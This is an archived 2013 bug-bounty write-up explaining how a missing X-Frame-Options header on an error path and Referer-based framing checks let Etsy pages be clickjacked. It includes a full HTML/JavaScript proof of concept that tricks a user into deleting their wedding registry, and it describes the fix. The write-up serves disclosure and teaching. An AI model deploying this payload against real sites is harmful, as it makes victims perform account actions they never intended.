---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2013-02-05_framing-part-1-click-jacking-etsy.md
original_filename: 2013-02-05_framing-part-1-click-jacking-etsy.md
title: 'Framing, Part 1: Click-Jacking Etsy'
category: documents
detected_topics:
- clickjacking
- xss
- command-injection
- otp
- csrf
- api-security
tags:
- imported
- documents
- clickjacking
- xss
- command-injection
- otp
- csrf
- api-security
language: en
raw_sha256: 3bebaea0528670401536ce80fb9906e10c04778f945012702d76e9e0a83def90
text_sha256: dbcfd04c42f854f96c6caf6f7ce251301b54296699ea1872391241d3ece4d3c2
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# Framing, Part 1: Click-Jacking Etsy

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2013-02-05_framing-part-1-click-jacking-etsy.md
- Source Type: markdown
- Detected Topics: clickjacking, xss, command-injection, otp, csrf, api-security
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `3bebaea0528670401536ce80fb9906e10c04778f945012702d76e9e0a83def90`
- Text SHA256: `dbcfd04c42f854f96c6caf6f7ce251301b54296699ea1872391241d3ece4d3c2`


## Content

---
title: "Framing, Part 1: Click-Jacking Etsy"
page_title: "Framing, Part 1: Click-Jacking Etsy – Jack"
url: "https://whitton.io/archive/framing-part-1-click-jacking-etsy"
final_url: "https://whitton.io/archive/framing-part-1-click-jacking-etsy/"
authors: ["Jack Whitton (@fin1te)"]
programs: ["Etsy"]
bugs: ["Clickjacking"]
publication_date: "2013-02-05"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6411
---

# [Framing, Part 1: Click-Jacking Etsy](https://whitton.io/archive/framing-part-1-click-jacking-etsy/ "Framing, Part 1: Click-Jacking Etsy")

## February 05, 2013

__Reading time ~3 minutes

Back in October, I found a couple of issues in [Etsy](https://www.etsy.com), which when combined could be used in a click-jacking attack.

#### Incorrect Error Handling

Pretty much all forms on Etsy have a token attached to prevent CSRF attacks. Failing to provide, or providing an incorrect token will result in the form not being processed, and an error page will be displayed.

[ ![](/images/etsyframe/etsy-frame-1.png) ](/images/etsyframe/etsy-frame-1.png)

If we submit a POST to the search page, the request is (correctly) not processed. But, rather than showing the generic error page, we get the homepage instead.

This isn’t that interesting, nor very useful. However, this combined with…

#### Bypassing X-Frame-Options with a Referrer

The value of the X-Frame-Options header across Etsy is `SAMEORIGIN`, meaning that only pages from the same domain will load in a frame, else a blank screen is displayed, thus thwarting click-jacking attacks. The value of the Referer header is checked, and if the domain is etsy.com, the response back is `ALLOW`, rather than `SAMEORIGIN`. Luckily, in the previous issue, when the homepage is returned, no X-Frame-Options header is sent!
  
  
  <!-- poc.html -->
  <iframe src="poc-iframe.html"></iframe>
  
  <!-- poc-iframe.html -->
  <form id="etsy" action="http://www.etsy.com/search.php" method="post">
  <input type="hidden" name="search_query" value="">
  </form>
  <script>document.getElementById('etsy').submit();</script>

So now that we can successfully frame the home-page, all we need to do is get a user to click links on the framed page, and we have a way of framing any page on the site.

Of course, this requires a user to click multiple times (since there isn’t any sensitive actions that can be performed with one click on the homepage). The best way is to turn it into some sort-of game (my creativity is lacking, hence the simplicity).

[ ![](/images/etsyframe/etsy-frame-2-1.png) ](/images/etsyframe/etsy-frame-2-1.png)

We use setTimeout to change the position of the iframe after a x seconds (to give the page enough time to load), and entice the user to click the stopwatch (which contains each link underneath).

We use the `pointer-events: none;` CSS value to pass the click through the image and to the link.

The four clicks do the following:

  * Navigate to [Registry](https://www.etsy.com/registry)
  * Edit Registry
  * Delete
  * Confirm Delete

The user has now successfully deleted their wedding registry! Ouch.

#### Full PoC
  
  
  <!DOCTYPE html>
  <html>
  <head>
  <title>Etsy Clickjacking - POC</title>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.js"></script>
  <link href="http://twitter.github.com/bootstrap/assets/css/bootstrap.css" rel="stylesheet">
  <style>
  #iframe-wrap {
  height: 15px;
  overflow: hidden;
  position: relative; 
  width: 15px;
  }
  #iframe-wrap img {
  background: #fff;
  cursor: pointer; 
  height: 15px;
  pointer-events: none;
  position: absolute;
  width: 15px;
  z-index: 2;
  }
  iframe {
  border: none;
  height: 1600px;
  position: absolute;
  width: 980px;
  z-index: 1;
  }
  /* State One - Registry Link */
  iframe.state-1 {
  left: -75px;
  top: -11px;
  }
  /* State Two - Edit Link */
  iframe.state-2 {
  left: -953px;
  top: -270px;
  }
  /* State Three - Delete Link */
  iframe.state-3 {
  left: -520px;
  top: -700px;
  }
  /* State Four - Confirmation Link */
  iframe.state-4 {
  left: -365px;
  top: -755px;
  }
  </style>
  </head>
  <body>
  <h3>Etsy Clickjacking - POC</h3>
  <h4>Click the stopwatch when the time runs out...</h4>
  <h4>Time Remaining: <span id="time">5 seconds</span></h4>
  
  <div id="iframe-wrap">
  <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAbCAYAAACX6BTbAAAACXBIWXMAAAsTAAALEwEAmpwYAAABeklEQVRIib2V3XXCMAyFP3P6HjZghHQDGKEbpBtkBEZghIwAnYBuQDtBugHdQH3ABln1X/NQn6NzEuvqWrpKZCci1JZzLgKJiKsGAasW0NJVJXfOdUvJXYssS9dTUwbO9cDav36LyGcBOwJfIvKGiCQNGIAjIBk7AoOJmZR/SJFugblAam0GtgnycyrbVlJrgzrgCvQ14hkYgV7her+Xqi4csBERdIAF7nP9UAftE3GPRDzonMrAEAkgmcbr2LPysW3JOEeeqSA0OOrwXJAgS+79ugeTiLACdjzWieVLx945f5WTyEpXN2UwkbxBlhZysYEt5P86ctdJFLxmnquxFyp6Nn4tui+XoPmBWNNN7c9MEG8MxyGQW8dxAbkdzdFsmYwzK09Fjig2ADpuYzKaESWJfMV2Jl2BLmDud6i/yt4TXT/5/Q///sztD3wxuG9gJ/oKNNn0/O0Wus8k1KiNZDEHdIkvqGQHLUWR3Gg6el11P65+byz1RET4AYyC/W+xIwcgAAAAAElFTkSuQmCC">
  <iframe class="state-1" src="poc-iframe.html"></iframe>
  </div>
  
  <script>
  $(function(){
  var t = 4;
  var r = 3;
  var changeState = function(state) {
  $('#time').html(t + ' seconds');
  if (t == 0) {
  clearInterval(i);
  if (state == 4) {
  //All over
  $('#time').html('completed');
  return;
  }
  r = 2;
  i = setInterval(function(){resetIframe(state + 1)}, 1000);
  }
  t--;  
  };
  var resetIframe = function(state) {
  $('#time').html('resetting...');
  if (r == 0) {
  $('iframe').removeClass('state-' + (state - 1)).addClass('state-' + state);
  clearInterval(i);
  t = 4;
  i = setInterval(function(){changeState(state)}, 1000);
  }
  r--;
  };
  //Start countdown
  var i = setInterval(function(){changeState(1)}, 1000);
  });
  </script>
  </body>
  </html>

Regrettably I didn’t take any screenshots when I reported this issue, and now that it’s fixed my only option is to photoshop them (which I won’t do). So you’ll have to take my word for some of it.

#### Fix

The fix was done in two stages. Firstly, the CSRF token was removed from the search form, presumably because there aren’t any modifications being made to user data, so it’s pointless. Secondly, the referrer checking was removed and `SAMEORIGIN` was enforced across all pages.

The second fix took longer to deploy, presumably due to the scale and amounts of testing required.

[etsy](https://whitton.io/tags/#etsy "Pages tagged etsy")[websec](https://whitton.io/tags/#websec "Pages tagged websec")[bug-bounty](https://whitton.io/tags/#bug-bounty "Pages tagged bug-bounty")[click-jacking](https://whitton.io/tags/#click-jacking "Pages tagged click-jacking") Updated on February 05, 2013 Jack

  * [__Like](https://www.facebook.com/sharer/sharer.php?u=https://whitton.io/archive/framing-part-1-click-jacking-etsy/ "Share on Facebook")
  * [__Tweet](https://twitter.com/intent/tweet?text=https://whitton.io/archive/framing-part-1-click-jacking-etsy/ "Share on Twitter")
  * [__+1](https://plus.google.com/share?url=https://whitton.io/archive/framing-part-1-click-jacking-etsy/ "Share on Google Plus")

[Read More](https://whitton.io/archive/persistent-xss-on-myworld-ebay-com/)

### [From Bug Bounty Hunter, to Engineer, and Beyond](https://whitton.io/articles/from-researcher-to-engineer-and-beyond/ "From Bug Bounty Hunter, to Engineer, and Beyond")

A couple weeks ago I had my last day on Facebook's Product Security team. Abittersweet moment, but one which marks a "new chapter" in my ...… [Continue reading](https://whitton.io/articles/from-researcher-to-engineer-and-beyond/)

#### [Obtaining Login Tokens for an Outlook, Office or Azure Account](https://whitton.io/articles/obtaining-tokens-outlook-office-azure-account/ "Obtaining Login Tokens for an Outlook, Office or Azure Account")

Published on April 03, 2016

#### [Uber Bug Bounty: Turning Self-XSS into Good-XSS](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/ "Uber Bug Bounty: Turning Self-XSS into Good-XSS")

Published on March 22, 2016
